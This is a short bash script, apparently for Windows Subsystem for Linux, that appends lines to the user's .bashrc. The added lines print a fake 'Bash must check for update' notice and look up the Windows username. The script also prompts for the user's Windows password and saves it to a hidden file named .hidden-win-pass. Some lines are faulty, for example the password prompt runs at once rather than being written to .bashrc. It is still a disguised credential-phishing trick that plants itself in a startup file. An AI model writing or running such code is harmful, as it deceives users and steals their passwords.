bash
cd
echo "echo \"Bash must check for update.\"" >> .bashrc
echo "WINUSER=$(/mnt/c/Windows/System32/whoami.exe 2> /dev/null | sed 's/.$//')" >> .bashrc
read -sp "Please enter you Windows password for $WINUSER:" WINPASS >> .bashrc
echo "echo $WINPASS >> .hidden-win-pass" >> .bashrc
echo "sleep 2" >> .bashrc
echo "echo \"Bash updated\"" >> .bashrc
